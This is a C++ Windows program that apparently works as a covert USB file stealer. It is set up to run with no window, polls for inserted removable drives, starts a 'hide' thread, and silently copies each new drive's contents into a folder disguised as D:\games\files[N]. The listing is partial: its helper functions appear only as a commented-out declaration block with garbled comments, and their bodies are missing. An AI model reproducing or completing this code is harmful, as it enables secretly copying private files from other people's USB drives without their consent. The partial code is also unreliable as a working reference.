#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")	
#include <windows.h>
#include <string.h>
#include <string>
#include <stdlib.h>
#include <vector>
#include <algorithm>
using namespace std;

unsigned char i;
bool active;
int usbnums;
char src[20] = "X:\\";
char dest[20] = "D:\\games\\files[X]\\";
char dest0[20] = "D:\\games\\files[0]\\";
char usbname[20];
vector<string> usbnames;

HANDLE hthread_stare = NULL;
HANDLE hthread_hide = NULL;
HANDLE husb = NULL;
UINT DiskType;

/*-------------------------------------------------------------------------------------------
void copy(bool default_dest);	//����Ĭ��"���ƶ�����",ͳһ����file[0], �����ֵĶ���file[i]
DWORD WINAPI hide(LPVOID);		//hide�߳�����cmd���ڣ�һ�����ּ������������
DWORD WINAPI stare(LPVOID);	//stare����U�̣�һ���˳�active��false
bool checkusbname();	//ͬ����U�̲�����
int checkusb();	//ֻ�ܸ��Ƶ�һ�������U��
--------------------------------------------------------------------------------------------*/


int main() {

	usbnums = 0;

	while (true) {				
		sprintf(dest, "D:\\games\\files[%d]\\", usbnums);
		if (checkusb()) {
			active = true;
			CreateThread(NULL, 0, stare, NULL, 0, NULL);
			GetVolumeInformation(src, usbname, 20, NULL, NULL, NULL, NULL, NULL);
			string defaultname = usbname;
			if (defaultname == "") {
				CreateThread(NULL, 0, hide, NULL, 0, NULL);
				copy(true);
			} else if (checkusbname()) {
				CreateThread(NULL, 0, hide, NULL, 0, NULL);
				copy(false);
				usbnames.push_back(usbname);
			}
			while (active)
				Sleep(5000);
		} else {
			Sleep(5000);
		}
			
	}
	return 0;
}